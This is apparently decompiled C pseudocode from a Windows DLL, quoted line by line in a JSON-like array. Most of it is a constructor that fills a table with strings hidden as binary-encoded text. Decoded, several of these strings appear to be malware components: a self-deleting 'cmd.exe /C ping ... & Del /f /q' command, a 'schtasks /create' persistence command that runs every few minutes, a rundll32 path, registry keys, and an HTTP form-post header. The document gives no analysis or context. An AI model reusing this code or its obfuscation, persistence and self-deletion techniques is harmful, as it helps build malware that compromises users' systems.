    "  *((_DWORD *)this + 322) = 0;",
    "  *((_DWORD *)this + 323) = 15;",
    "  *((_BYTE *)this + 1272) = 0;",
    "  this[81] = 0;",
    "  *((_DWORD *)this + 328) = 0;",
    "  *((_DWORD *)this + 329) = 15;",
    "  *((_BYTE *)this + 1296) = 0;",
    "  *(_OWORD *)((char *)this + 1320) = 0;",
    "  *((_DWORD *)this + 334) = 0;",
    "  *((_DWORD *)this + 335) = 15;",
    "  *((_BYTE *)this + 1320) = 0;",
    "  this[84] = 0;",
    "  *((_DWORD *)this + 340) = 0;",
    "  *((_DWORD *)this + 341) = 15;",
    "  *((_BYTE *)this + 1344) = 0;",
    "  *(_OWORD *)((char *)this + 1368) = 0;",
    "  *((_DWORD *)this + 346) = 0;",
    "  *((_DWORD *)this + 347) = 15;",
    "  *((_BYTE *)this + 1368) = 0;",
    "  this[87] = 0;",
    "  *((_DWORD *)this + 352) = 0;",
    "  *((_DWORD *)this + 353) = 15;",
    "  *((_BYTE *)this + 1392) = 0;",
    "  *(_OWORD *)((char *)this + 1416) = 0;",
    "  *((_DWORD *)this + 358) = 0;",
    "  *((_DWORD *)this + 359) = 15;",
    "  *((_BYTE *)this + 1416) = 0;",
    "  this[90] = 0;",
    "  *((_DWORD *)this + 364) = 0;",
    "  *((_DWORD *)this + 365) = 15;",
    "  *((_BYTE *)this + 1440) = 0;",
    "  *(_OWORD *)((char *)this + 1464) = 0;",
    "  *((_DWORD *)this + 370) = 0;",
    "  *((_DWORD *)this + 371) = 15;",
    "  *((_BYTE *)this + 1464) = 0;",
    "  this[93] = 0;",
    "  *((_DWORD *)this + 376) = 0;",
    "  *((_DWORD *)this + 377) = 15;",
    "  *((_BYTE *)this + 1488) = 0;",
    "  *(_OWORD *)((char *)this + 1512) = 0;",
    "  *((_DWORD *)this + 382) = 0;",
    "  *((_DWORD *)this + 383) = 15;",
    "  *((_BYTE *)this + 1512) = 0;",
    "  this[96] = 0;",
    "  *((_DWORD *)this + 388) = 0;",
    "  *((_DWORD *)this + 389) = 15;",
    "  *((_BYTE *)this + 1536) = 0;",
    "  *(_OWORD *)((char *)this + 1560) = 0;",
    "  *((_DWORD *)this + 394) = 0;",
    "  *((_DWORD *)this + 395) = 15;",
    "  *((_BYTE *)this + 1560) = 0;",
    "  this[99] = 0;",
    "  *((_DWORD *)this + 400) = 0;",
    "  *((_DWORD *)this + 401) = 15;",
    "  *((_BYTE *)this + 1584) = 0;",
    "  *(_OWORD *)((char *)this + 1608) = 0;",
    "  *((_DWORD *)this + 406) = 0;",
    "  *((_DWORD *)this + 407) = 15;",
    "  *((_BYTE *)this + 1608) = 0;",
    "  this[102] = 0;",
    "  *((_DWORD *)this + 412) = 0;",
    "  *((_DWORD *)this + 413) = 15;",
    "  *((_BYTE *)this + 1632) = 0;",
    "  *(_OWORD *)((char *)this + 1656) = 0;",
    "  *((_DWORD *)this + 418) = 0;",
    "  *((_DWORD *)this + 419) = 15;",
    "  *((_BYTE *)this + 1656) = 0;",
    "  this[105] = 0;",
    "  *((_DWORD *)this + 424) = 0;",
    "  *((_DWORD *)this + 425) = 15;",
    "  *((_BYTE *)this + 1680) = 0;",
    "  *(_OWORD *)((char *)this + 1704) = 0;",
    "  *((_DWORD *)this + 430) = 0;",
    "  *((_DWORD *)this + 431) = 15;",
    "  *((_BYTE *)this + 1704) = 0;",
    "  this[108] = 0;",
    "  *((_DWORD *)this + 436) = 0;",
    "  *((_DWORD *)this + 437) = 15;",
    "  *((_BYTE *)this + 1728) = 0;",
    "  *(_OWORD *)((char *)this + 1752) = 0;",
    "  *((_DWORD *)this + 442) = 0;",
    "  *((_DWORD *)this + 443) = 15;",
    "  *((_BYTE *)this + 1752) = 0;",
    "  this[111] = 0;",
    "  *((_DWORD *)this + 448) = 0;",
    "  *((_DWORD *)this + 449) = 15;",
    "  *((_BYTE *)this + 1776) = 0;",
    "  *(_OWORD *)((char *)this + 1800) = 0;",
    "  *((_DWORD *)this + 454) = 0;",
    "  *((_DWORD *)this + 455) = 15;",
    "  *((_BYTE *)this + 1800) = 0;",
    "  this[114] = 0;",
    "  *((_DWORD *)this + 460) = 0;",
    "  *((_DWORD *)this + 461) = 15;",
    "  *((_BYTE *)this + 1824) = 0;",
    "  *(_OWORD *)((char *)this + 1848) = 0;",
    "  *((_DWORD *)this + 466) = 0;",
    "  *((_DWORD *)this + 467) = 15;",
    "  *((_BYTE *)this + 1848) = 0;",
    "  this[117] = 0;",
    "  *((_DWORD *)this + 472) = 0;",
    "  *((_DWORD *)this + 473) = 15;",
    "  *((_BYTE *)this + 1872) = 0;",
    "  *(_OWORD *)((char *)this + 1896) = 0;",
    "  *((_DWORD *)this + 478) = 0;",
    "  *((_DWORD *)this + 479) = 15;",
    "  *((_BYTE *)this + 1896) = 0;",
    "  this[120] = 0;",
    "  *((_DWORD *)this + 484) = 0;",
    "  *((_DWORD *)this + 485) = 15;",
    "  *((_BYTE *)this + 1920) = 0;",
    "  *(_OWORD *)((char *)this + 1944) = 0;",
    "  *((_DWORD *)this + 490) = 0;",
    "  *((_DWORD *)this + 491) = 15;",
    "  *((_BYTE *)this + 1944) = 0;",
    "  this[123] = 0;",
    "  *((_DWORD *)this + 496) = 0;",
    "  *((_DWORD *)this + 497) = 15;",
    "  *((_BYTE *)this + 1968) = 0;",
    "  *(_OWORD *)((char *)this + 1992) = 0;",
    "  *((_DWORD *)this + 502) = 0;",
    "  *((_DWORD *)this + 503) = 15;",
    "  *((_BYTE *)this + 1992) = 0;",
    "  this[126] = 0;",
    "  *((_DWORD *)this + 508) = 0;",
    "  *((_DWORD *)this + 509) = 15;",
    "  *((_BYTE *)this + 2016) = 0;",
    "  *(_OWORD *)((char *)this + 2040) = 0;",
    "  *((_DWORD *)this + 514) = 0;",
    "  *((_DWORD *)this + 515) = 15;",
    "  *((_BYTE *)this + 2040) = 0;",
    "  this[129] = 0;",
    "  *((_DWORD *)this + 520) = 0;",
    "  *((_DWORD *)this + 521) = 15;",
    "  *((_BYTE *)this + 2064) = 0;",
    "  *(_OWORD *)((char *)this + 2088) = 0;",
    "  *((_DWORD *)this + 526) = 0;",
    "  *((_DWORD *)this + 527) = 15;",
    "  *((_BYTE *)this + 2088) = 0;",
    "  this[132] = 0;",
    "  *((_DWORD *)this + 532) = 0;",
    "  *((_DWORD *)this + 533) = 15;",
    "  *((_BYTE *)this + 2112) = 0;",
    "  *(_OWORD *)((char *)this + 2136) = 0;",
    "  *((_DWORD *)this + 538) = 0;",
    "  *((_DWORD *)this + 539) = 15;",
    "  *((_BYTE *)this + 2136) = 0;",
    "  this[135] = 0;",
    "  *((_DWORD *)this + 544) = 0;",
    "  *((_DWORD *)this + 545) = 15;",
    "  *((_BYTE *)this + 2160) = 0;",
    "  *(_OWORD *)((char *)this + 2184) = 0;",
    "  *((_DWORD *)this + 550) = 0;",
    "  *((_DWORD *)this + 551) = 15;",
    "  *((_BYTE *)this + 2184) = 0;",
    "  this[138] = 0;",
    "  *((_DWORD *)this + 556) = 0;",
    "  *((_DWORD *)this + 557) = 15;",
    "  *((_BYTE *)this + 2208) = 0;",
    "  v1 = (char *)this + 2232;",
    "  *(_OWORD *)((char *)this + 2232) = 0;",
    "  *((_DWORD *)this + 562) = 0;",
    "  *((_DWORD *)this + 563) = 15;",
    "  *((_BYTE *)this + 2232) = 0;",
    "  v2 = this + 141;",
    "  this[141] = 0;",
    "  *((_DWORD *)this + 568) = 0;",
    "  *((_DWORD *)this + 569) = 15;",
    "  *((_BYTE *)this + 2256) = 0;",
    "  sub_100030B0(",
    "    this,",
    "    \"00000000011100010000000001110111000000000110010100000000011100100000000001100001000000000111001100000000011001000000\"",
    "    \"00000111101000000000011000110000000001111000000000000111011100000000011100110000000000000000\",",
    "    0xD0u);",
    "  sub_100030B0(",
    "    (char *)this + 24,",
    "    \"00000000011100010000000001110111000000000110010100000000011100100000000001100001000000000111001100000000011001000000\"",
    "    \"0000011110100000000001100011000000000111100000000000011101110000000001110011000000000111011100000000011001010000000000000000\",",
    "    0xF0u);",
    "  sub_100030B0(",
    "    this + 3,",
    "    \"00000000011100010000000001110111000000000110000100000000011100100000000001100001000000000111001100000000011001000000\"",
    "    \"00000111101000000000011000110000000001111000000000000111011100000000011100110000000000000000\",",
    "    0xD0u);",
    "  sub_100030B0(",
    "    (char *)this + 72,",
    "    \"00000000010010000000000001000001000000000101010000000000011010000000000001100111000000000101001000000000011011000000\"",
    "    \"00000110001100000000011001010000000001100100000000000111010000000000010010010000000001101011000000000111001100000000\"",
    "    \"0110010100000000010101100000000000000000\",",
    "    0x110u);",
    "  sub_100030B0(",
    "    this + 6,",
    "    \"00000000010010000000000001100001000000000111010000000000011010000000000001100111000000000111001000000000010011000000\"",
    "    \"00000110001100000000011001010000000001100100000000000111010000000000011010010000000001101011000000000111001100000000\"",
    "    \"0110010100000000010101100000000000000000\",",
    "    0x110u);",
    "  sub_100030B0(",
    "    (char *)this + 120,",
    "    \"00000000010001100000000001110001000000000111011100000000011001010000000001101010000000000111001000000000010010100000\"",
    "    \"0000011010110000000001101101000000000111000100000000010010000000000000000000\",",
    "    0xC0u);",
    "  sub_100030B0(",
    "    this + 9,",
    "    \"00000000010001010000000001100110000000000111010000000000011001100000000001110001000000000100100000000000011011110000\"",
    "    \"00000110101100000000011100000000000000000000\",",
    "    0xA0u);",
    "  sub_100030B0(",
    "    (char *)this + 168,",
    "    \"00000000010010000000000001110111000000000110001100000000010101000000000001110000000000000110000100000000011110100000\"",
    "    \"00000110110100000000011100010000000001100001000000000111100100000000010000100000000001101101000000000110111100000000\"",
    "    \"0111000000000000010011010000000000000000\",",
    "    0x110u);",
    "  sub_100030B0(",
    "    this + 12,",
    "    \"00000000010010000000000001110111000000000110001100000000010101000000000001110000000000000110000100000000011110100000\"",
    "    \"00000100001000000000011011010000000001101111000000000111000000000000010011010000000000000000\",",
    "    0xD0u);",
    "  sub_100030B0(",
    "    (char *)this + 216,",
    "    \"00000000010001000000000001100111000000000111011100000000011001010000000001101001000000000110111100000000001110010000\"",
    "    \"00000011000000000000011010010000000001110000000000000111000000000000011100000000000000000000\",",
    "    0xD0u);",
    "  sub_100030B0(",
    "    this + 15,",
    "    \"00000000011010010000000001110111000000000111010100000000010100100000000001110010000000000110100100000000011010000000\"",
    "    \"00000111011100000000010010010000000001101001000000000110001000000000011000100000000001100010000000000101010100000000\"",
    "    \"01100110000000000110001000000000011101100000000001100010000000000100110000000000011010100000000001101001000000000110\"",
    "    \"00100000000001110110000000000100011100000000011100110000000001100010000000000110001000000000011100110000000001000110\"",
    "    \"0000000000000000\",",
    "    0x1E0u);",
    "  sub_100030B0(",
    "    (char *)this + 264,",
    "    \"00000000010001110000000001110100000000000111011100000000010100010000000001101111000000000110101000000000011100010000\"",
    "    \"000001001001000000000110111000000000011110000000000001010110000000000110111000000000010000010000000000000000\",",
    "    0xE0u);",
    "  sub_100030B0(",
    "    this + 18,",
    "    \"00000000010001110000000001101111000000000111010000000000010001010000000001110100000000000110111100000000011100000000\"",
    "    \"00000110111000000000010101000000000001110010000000000110111100000000011100000000000001101000000000000100010000000000\"",
    "    \"0110100100000000011110010000000000000000\",",
    "    0x110u);",
    "  sub_100030B0(",
    "    (char *)this + 312,",
    "    \"00000000010010000000000001111001000000000111011100000000011101010000000001100010000000000111011100000000011100110000\"",
    "    \"0000010010110000000001101101000000000110000100000000011101110000000000000000\",",
    "    0xC0u);",
    "  sub_100030B0(",
    "    this + 21,",
    "    \"00000000010010000000000001111001000000000111011100000000011101010000000001100010000000000111011100000000011100110000\"",
    "    \"00000100101100000000011011010000000001100001000000000111011100000000011101110000000001000100000000000111011100000000\"",
    "    \"011001010000000001110010000000000111000100000000011001100000000000000000\",",
    "    0x130u);",
    "  sub_100030B0(",
    "    (char *)this + 360,",
    "    \"00000000010001110000000001110100000000000111011100000000010100010000000001101111000000000110101000000000011100010000\"",
    "    \"000001001001000000000110111000000000011110000000000001010110000000000110111000000000010010010000000000000000\",",
    "    0xE0u);",
    "  sub_100030B0(",
    "    this + 24,",
    "    \"00000000010001110000000001110100000000000111011100000000010011110000000001101111000000000110101000000000011100010000\"",
    "    \"00000110110100000000010010010000000001111000000000000110111100000000011000110000000001100110000000000101101000000000\"",
    "    \"0111000100000000010100110000000000000000\",",
    "    0x110u);",
    "  sub_100030B0(",
    "    (char *)this + 408,",
    "    \"00000000010101000000000001110111000000000110010100000000011100100000000001100001000000000111001100000000011001000000\"",
    "    \"0000010110100000000001100011000000000111100000000000011101110000000000000000\",",
    "    0xC0u);",
    "  sub_100030B0(",
    "    this + 27,",
    "    \"00000000010001000000000001100111000000000111011100000000011001010000000001101001000000000110111100000000001110010000\"",
    "    \"00000100111100000000011010010000000001110000000000000111000000000000011011000000000001111010000000000111001000000000\"",
    "    \"01000110000000000110101000000000011101010000000001100001000000000110001000000000011100010000000001101011000000000111\"",
    "    \"00000000000001101111000000000111000000000000011100010000000000000000\",",
    "    0x1A0u);",
    "  sub_100030B0(",
    "    (char *)this + 456,",
    "    \"00000000010001100000000001100110000000000100011000000000011001100000000001100110000000000110011000000000011001100000\"",
    "    \"0000011001100000000001100110000000000110011000000000011001100000000001100110000000000110011000000000011001100000000000000000\",",
    "    0xF0u);",
    "  sub_100030B0(",
    "    this + 30,",
    "    \"00000000010001100000000001100110000000000100011000000000011001100000000001100110000000000110011000000000011001100000\"",
    "    \"00000110011000000000010001100000000001100110000000000110011000000000011001100000000001100110000000000110011000000000\"",
    "    \"0110011000000000011001100000000000000000\",",
    "    0x110u);",
    "  sub_100030B0(",
    "    (char *)this + 504,",
    "    \"00000000010010010000000001101110000000000110111000000000011011100000000001101110000000000111011100000000010110010000\"",
    "    \"00000111011100000000011100110000000001100100000000000101011000000000011011110000000001101110000000000111001000000000\"",
    "    \"011101110000000001000100000000000110001000000000011010100000000001100101000000000111011000000000011101100000000000000000\",",
    "    0x160u);",
    "  sub_100030B0(",
    "    this + 33,",
    "    \"00000000010110010000000001101000000000000110100000000000011110100000000001000010000000000110100100000000011101110000\"",
    "    \"00000110100000000000010011100000000001101111000000000110101000000000011100010000000001101110000000000110011000000000\"",
    "    \"0110110000000000010001000000000000000000\",",
    "    0x110u);",
    "  sub_100030B0(",
    "    (char *)this + 552,",
    "    \"00000000010110010000000001101000000000000111101000000000011110100000000001111010000000000111101000000000011110100000\"",
    "    \"00000111101000000000010100100000000001111010000000000111101000000000010011100000000001111010000000000111101000000000\"",
    "    \"011110100000000001111010000000000111101000000000010010000000000000000000\",",
    "    0x130u);",
    "  sub_100030B0(",
    "    this + 36,",
    "    \"00000000010110010000000001101000000000000111101000000000011110100000000001111010000000000111101000000000011110100000\"",
    "    \"00000111101000000000010010010000000001111010000000000111101000000000011110100000000001001100000000000111101000000000\"",
    "    \"01111010000000000111101000000000011110100000000000000000\",",
    "    0x120u);",
    "  sub_100030B0(",
    "    (char *)this + 600,",
    "    \"00000000010010000000000001111001000000000110011100000000011001110000000001100111000000000110011100000000011001110000\"",
    "    \"00000110011100000000010000100000000001101010000000000110101000000000011010100000000001101010000000000110101000000000\"",
    "    \"0110101000000000010100110000000000000000\",",
    "    0x110u);",
    "  sub_100030B0(",
    "    this + 39,",
    "    \"00000000010110100000000001100010000000000110001000000000011000100000000001100010000000000110001000000000010011110000\"",
    "    \"0000011011100000000001101110000000000110111000000000011011100000000001101110000000000110111000000000010001100000000000000000\",",
    "    0xF0u);",
    "  sub_100030B0(",
    "    (char *)this + 648,",
    "    \"00000000010001110000000001000111000000000100011100000000010101010000000000000000\",",
    "    0x50u);",
    "  sub_100030B0(",
    "    this + 42,",
    "    \"00000000010001110000000001101000000000000111100100000000011010000000000001111001000000000110100000000000011110010000\"",
    "    \"000001101000000000000111100100000000010101100000000001101101000000000110101100000000011011010000000000000000\",",
    "    0xE0u);",
    "  sub_100030B0(",
    "    (char *)this + 696,",
    "    \"00000000011011110000000001110011000000000110011000000000011001110000000001100110000000000110011000000000011110010000\"",
    "    \"00000111011100000000011001010000000001111001000000000111100100000000011001010000000001100110000000000111100100000000\"",
    "    \"011001010000000000000000\",",
    "    0x100u);",
    "  sub_100030B0(this + 45, &unk_10038CD4, 2u);",
    "  sub_100030B0((char *)this + 744, &unk_10038CD8, 0xCu);",
    "  sub_100030B0(this + 48, &unk_10038CE8, 0xEu);",
    "  sub_100030B0((char *)this + 792, &unk_10038CF8, 0xBu);",
    "  sub_100030B0(this + 51, &unk_10038D04, 0x10u);",
    "  sub_100030B0((char *)this + 840, &unk_10038D18, 0x10u);",
    "  sub_100030B0(this + 54, &unk_10038D2C, 0xBu);",
    "  sub_100030B0((char *)this + 888, &unk_10038D38, 9u);",
    "  sub_100030B0(this + 57, &unk_10038D44, 0x10u);",
    "  sub_100030B0((char *)this + 936, &unk_10038D58, 0xCu);",
    "  sub_100030B0(this + 60, &unk_10038D68, 0xCu);",
    "  sub_100030B0((char *)this + 984, &unk_10038D78, 0x1Du);",
    "  sub_100030B0(",
    "    this + 63,",
    "    \"00000000010100110000000001001111000000000100011000000000010101000000000001010111000000000100000100000000010100100000\"",
    "    \"00000100010100000000010111000000000001001101000000000110100100000000011000110000000001110010000000000110111100000000\"",
    "    \"01110011000000000110111100000000011001100000000001110100000000000101110000000000010101110000000001101001000000000110\"",
    "    \"11100000000001100100000000000110111100000000011101110000000001110011000000000010000000000000010011100000000001010100\"",
    "    \"00000000010111000000000001000011000000000111010100000000011100100000000001110010000000000110010100000000011011100000\"",
    "    \"00000111010000000000010101100000000001100101000000000111001000000000011100110000000001101001000000000110111100000000\"",
    "    \"011011100000000000000000\",",
    "    0x2D0u);",
    "  sub_100030B0((char *)this + 1032, &unk_1003906C, 0xDu);",
    "  sub_100030B0(this + 66, &unk_1003907C, 0x10u);",
    "  sub_100030B0((char *)this + 1080, &unk_10039090, 0xBu);",
    "  sub_100030B0(this + 69, &unk_1003909C, 0x12u);",
    "  sub_100030B0(",
    "    (char *)this + 1128,",
    "    \"00000000010100110000000001101111000000000110011000000000011101000000000001110111000000000110000100000000011100100000\"",
    "    \"00000110010100000000010111000000000001001101000000000110100100000000011000110000000001110010000000000110111100000000\"",
    "    \"01110011000000000110111100000000011001100000000001110100000000000101110000000000010101110000000001101001000000000110\"",
    "    \"11100000000001100100000000000110111100000000011101110000000001110011000000000101110000000000010000110000000001110101\"",
    "    \"00000000011100100000000001110010000000000110010100000000011011100000000001110100000000000101011000000000011001010000\"",
    "    \"00000111001000000000011100110000000001101001000000000110111100000000011011100000000001011100000000000101010100000000\"",
    "    \"01101110000000000110100100000000011011100000000001110011000000000111010000000000011000010000000001101100000000000110\"",
    "    \"11000000000000000000\",",
    "    0x340u);",
    "  sub_100030B0(this + 72, &unk_100393F4, 0xDu);",
    "  sub_100030B0((char *)this + 1176, &unk_10039404, 0x10u);",
    "  sub_100030B0(",
    "    this + 75,",
    "    \"000000000010010100000000011100110000000001011100000000000010010100000000011100110000000000000000\",",
    "    0x60u);",
    "  sub_100030B0((char *)this + 1224, &unk_1003947C, 0xBu);",
    "  sub_100030B0(this + 78, &unk_10039488, 0xBu);",
    "  sub_100030B0(",
    "    (char *)this + 1272,",
    "    \"00000000011100110000000001101000000000000110100100000000001011100000000001110000000000000110110000000000011000010000000000000000\",",
    "    0x80u);",
    "  sub_100030B0(",
    "    this + 81,",
    "    \"00000000011100110000000001101111000000000110001100000000011010110000000001100101000000000111001000000000001011100000\"",
    "    \"000001100100000000000110110000000000011011000000000000000000\",",
    "    0xB0u);",
    "  sub_100030B0((char *)this + 1320, &unk_100395D4, 5u);",
    "  sub_100030B0(this + 84, &unk_100395DC, 5u);",
    "  sub_100030B0((char *)this + 1368, &unk_100395E4, 8u);",
    "  sub_100030B0(this + 87, &unk_100395F0, 6u);",
    "  sub_100030B0((char *)this + 1416, &unk_100395F8, 5u);",
    "  sub_100030B0(",
    "    this + 90,",
    "    \"00000000011111000000000001111100000000000111110000000000011111000000000001111100000000000111110000000000010011100000\"",
    "    \"00000011000100000000011111000000000001111100000000000111110000000000001100010000000001111100000000000111110000000000\"",
    "    \"011111000000000000000000\",",
    "    0x100u);",
    "  sub_100030B0((char *)this + 1464, \"00000000001111100000000000000000\", 0x20u);",
    "  sub_100030B0(this + 93, &unk_10039728, 9u);",
    "  sub_100030B0((char *)this + 1512, &unk_10039734, 0xEu);",
    "  sub_100030B0(this + 96, &unk_10039744, 0x10u);",
    "  sub_100030B0(",
    "    (char *)this + 1560,",
    "    \"00000000010111000000000001110011000000000111100100000000011100110000000001110100000000000110010100000000011011010000\"",
    "    \"00000011001100000000001100100000000001011100000000000111001000000000011101010000000001101110000000000110010000000000\"",
    "    \"01101100000000000110110000000000001100110000000000110010000000000010111000000000011001010000000001111000000000000110\"",
    "    \"01010000000000000000\",",
    "    0x170u);",
    "  sub_100030B0(this + 99, &unk_100398CC, 0xAu);",
    "  sub_100030B0((char *)this + 1608, &unk_100398D8, 0xBu);",
    "  sub_100030B0(this + 102, &unk_100398E4, 0x15u);",
    "  sub_100030B0((char *)this + 1656, &off_100398FC, 0xDu);",
    "  sub_100030B0(this + 105, &unk_1003990C, 0x10u);",
    "  sub_100030B0((char *)this + 1704, &unk_10039920, 0x10u);",
    "  sub_100030B0(this + 108, &unk_10039934, 0x10u);",
    "  sub_100030B0((char *)this + 1752, &unk_10039948, 0x12u);",
    "  sub_100030B0(this + 111, &unk_1003995C, 0x10u);",
    "  sub_100030B0(",
    "    (char *)this + 1800,",
    "    \"00000000010100000000000001001100000000000100000100000000010010010000000001001110000000000010111000000000011001000000\"",
    "    \"00000110110000000000011011000000000000000000\",",
    "    0xA0u);",
    "  sub_100030B0(",
    "    this + 114,",
    "    \"00000000011000110000000001101101000000000110010000000000001011100000000001100101000000000111100000000000011001010000\"",
    "    \"00000010000000000000001011110000000001000011000000000010000000000000011100000000000001101001000000000110111000000000\"",
    "    \"01100111000000000010000000000000001100010000000000101110000000000011000100000000001011100000000000110001000000000010\"",
    "    \"11100000000000110001000000000010000000000000001011010000000001101110000000000010000000000000001100010000000000100000\"",
    "    \"00000000001011010000000001110111000000000010000000000000001101010000000000110000000000000011000000000000001100000000\"",
    "    \"00000010000000000000001111100000000000100000000000000100111000000000011101010000000001101100000000000010000000000000\"",
    "    \"00100110000000000010000000000000010001000000000001100101000000000110110000000000001000000000000000101111000000000110\"",
    "    \"01100000000000100000000000000010111100000000011100010000000000100000000000000010001000000000001001010000000001110011\"",
    "    \"00000000001000100000000000000000\",",
    "    0x3C0u);",
    "  sub_100030B0((char *)this + 1848, &unk_10039DDC, 4u);",
    "  sub_100030B0(this + 117, &unk_10039DE4, 0xEu);",
    "  sub_100030B0(",
    "    (char *)this + 1896,",
    "    \"00000000010001100000000001010010000000000100111100000000010110000000000000000000\",",
    "    0x50u);",
    "  sub_100030B0(",
    "    this + 120,",
    "    \"00000000010100000000000001100101000000000111001000000000011001100000000001101111000000000111001000000000011011010000\"",
    "    \"00000101010000000000011000010000000001110011000000000110101100000000010011010000000001100001000000000110100100000000\"",
    "    \"0110111000000000011101000000000001100001000000000110100100000000011011100000000000000000\",",
    "    0x140u);",
    "  sub_100030B0(",
    "    (char *)this + 1944,",
    "    \"00000000001011000000000001010110000000000110010100000000011011000000000001101111000000000110001100000000011010010000\"",
    "    \"0000011101000000000001111001000000000101001100000000011100000000000001100101000000000110010100000000011001000000000000000000\",",
    "    0xF0u);",
    "  sub_100030B0(",
    "    this + 123,",
    "    \"00000000011101000000000001101111000000000111010000000000011000010000000001101100000000000111001100000000011001010000\"",
    "    \"00000111001000000000011101100000000001101001000000000110001100000000011001010000000001110011000000000010111000000000\"",
    "    \"011010010000000001101110000000000110011000000000011011110000000000000000\",",
    "    0x130u);",
    "  sub_100030B0(",
    "    (char *)this + 1992,",
    "    \"00000000010000110000000001101111000000000110111000000000011101000000000001100101000000000110111000000000011101000000\"",
    "    \"00000010110100000000011101000000000001111001000000000111000000000000011001010000000000111010000000000010000000000000\"",
    "    \"01100001000000000111000000000000011100000000000001101100000000000110100100000000011000110000000001100001000000000111\"",
    "    \"01000000000001101001000000000110111100000000011011100000000000101111000000000111100000000000001011010000000001110111\"",
    "    \"00000000011101110000000001110111000000000010110100000000011001100000000001101111000000000111001000000000011011010000\"",
    "    \"00000010110100000000011101010000000001110010000000000110110000000000011001010000000001101110000000000110001100000000\"",
    "    \"011011110000000001100100000000000110010100000000011001000000000000000000\",",
    "    0x300u);",
    "  sub_100030B0(",
    "    this + 126,",
    "    \"00000000010101110000000001111000000000000111000000000000011011110000000001110010000000000110010100000000011100110000\"",
    "    \"00000110101000000000011000010000000001010100000000000110010100000000011110000000000001101111000000000111000000000000\"",
    "    \"01001101000000000110000100000000011011100000000001101111000000000111001000000000001011110000000001110000000000000111\"",
    "    \"01000000000001101111000000000110110100000000011001010000000001101011000000000110000100000000011100110000000001110010\"",
    "    \"00000000011001010000000001110011000000000110010000000000011010110000000001101111000000000110110000000000011001010000\"",
    "    \"0000011100100000000001110100000000000111100100000000011100110000000000000000\",",
    "    0x290u);",
    "  sub_100030B0(",
    "    (char *)this + 2040,",
    "    \"00000000010101110000000001111000000000000111000000000000011011110000000001110010000000000110010100000000011100110000\"",
    "    \"00000110101000000000011000010000000001010100000000000110010100000000011110000000000001101111000000000111000000000000\"",
    "    \"01001101000000000110000100000000011011100000000001101111000000000111001000000000001011110000000001110110000000000111\"",
    "    \"00100000000001110000000000000111010000000000011100000000000001110110000000000110000100000000011000100000000001101011\"",
    "    \"00000000011011110000000001101011000000000110000100000000011011010000000001100101000000000110101100000000011000010000\"",
    "    \"00000111001100000000011101000000000001110010000000000110000100000000001011110000000001001110000000000011000100000000\"",
    "    \"00101111000000000101001100000000010000010000000000000000\",",
    "    0x2F0u);",
    "  sub_100030B0(",
    "    this + 129,",
    "    \"00000000001011000000000000111111000000000110010100000000011010100000000001101010000000000111011100000000011001010000\"",
    "    \"00000110010000000000010000000000000001000000000000000101100100000000010000010000000001001000000000000101100000000000\"",
    "    \"010110100000000000000000\",",
    "    0x100u);",
    "  sub_100030B0(",
    "    (char *)this + 2088,",
    "    \"00000000010011010000000001101001000000000110001100000000011011110000000001110010000000000111001100000000011011110000\"",
    "    \"00000110011000000000011101000000000001010110000000000110010100000000011011000000000001101111000000000110001100000000\"",
    "    \"01101001000000000111010000000000011110010000000000000000\",",
    "    0x120u);",
    "  sub_100030B0(this + 132, &unk_1003AC8C, 4u);",
    "  sub_100030B0(",
    "    (char *)this + 2136,",
    "    \"00000000010101000000000001100101000000000110110100000000011100000000000000000000\",",
    "    0x50u);",
    "  sub_100030B0(",
    "    this + 135,",
    "    \"00000000010000110000000000111010000000000101110000000000010101110000000001101001000000000110111000000000011001000000\"",
    "    \"00000110111100000000011101110000000001110011000000000101110000000000010100110000000001111001000000000111001100000000\"",
    "    \"01110100000000000110010100000000011011010000000000110011000000000011001000000000010111000000000001110010000000000111\"",
    "    \"01010000000001101110000000000110010000000000011011000000000001101100000000000011001100000000001100100000000000101110\"",
    "    \"0000000001100101000000000111100000000000011001010000000000000000\",",
    "    0x210u);",
    "  sub_100030B0(",
    "    (char *)this + 2184,",
    "    \"00000000011100110000000001100011000000000110100000000000011101000000000001100001000000000111001100000000011010110000\"",
    "    \"00000111001100000000001000000000000000101111000000000110001100000000011100100000000001100101000000000110000100000000\"",
    "    \"011101000000000001100101000000000010000000000000001011110000000001110100000000000110111000000000001000000000000000000000\",",
    "    0x160u);",
    "  sub_100030B0(",
    "    this + 138,",
    "    \"00000000001011110000000001110011000000000110001100000000001000000000000001101101000000000110100100000000011011100000\"",
    "    \"00000111010100000000011101000000000001100101000000000010000000000000001011110000000001101101000000000110111100000000\"",
    "    \"0010000000000000001101000000000000000000\",",
    "    0x110u);",
    "  sub_100030B0(",
    "    v1,",
    "    \"00000000001000000000000000101111000000000111001100000000011000110000000000100000000000000110110100000000011010010000\"",
    "    \"00000110111000000000011101010000000001110100000000000110010100000000001000000000000000101111000000000110110100000000\"",
    "    \"01101111000000000010000000000000001101000000000000000000\",",
    "    0x120u);",
    "  sub_100030B0(",
    "    v2,",
    "    \"00000000001001010000000001101100000000000110111100000000011000110000000001100001000000000110110000000000011000010000\"",
    "    \"0000011100000000000001110000000000000110010000000000011000010000000001110100000000000110000100000000001001010000000000000000\",",
    "    0xF0u);",
    "  return this;",
    "}",
    "",
    "",
    "int sub_10002FE0()",
    "{",
    "  int result; // eax",
    "  _OWORD *Block; // [esp+4h] [ebp-14h]",
    "",
    "  result = dword_10040898;",
    "  if ( !dword_10040898 )",
    "  {",
    "    if ( _Mtx_lock((_Mtx_t)&unk_1003FAD0) )",
    "      std::_Throw_Cpp_error(5);",
    "    if ( dword_1003FAFC == 0x7FFFFFFF )",
    "    {",
    "      dword_1003FAFC = 2147483646;",
    "      std::_Throw_Cpp_error(6);",
    "    }",
    "    if ( !dword_10040898 )",
    "    {",
    "      Block = operator new(0x8E8u);",
    "      dword_10040898 = (int)sub_10001AF0(Block);",
    "    }",
    "    _Mtx_unlock((_Mtx_t)&unk_1003FAD0);",
    "    return dword_10040898;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void **__thiscall sub_100030B0(void **this, void *Src, size_t Size)",
    "{",
    "  unsigned int v4; // ecx",
    "  void *v5; // ebx",
    "  size_t v7; // ebx",
    "  int v8; // edx",
    "  _DWORD *v9; // eax",
    "  size_t v10; // eax",
    "  void *v11; // eax",
    "  void *v12; // ecx",
    "  void *v13; // eax",
    "  unsigned int v14; // [esp+Ch] [ebp-Ch]",
    "  _DWORD *v15; // [esp+14h] [ebp-4h]",
    "",
    "  v4 = (unsigned int)this[5];",
    "  v14 = v4;",
    "  if ( Size > v4 )",
    "  {",
    "    if ( Size > 0x7FFFFFFF )",
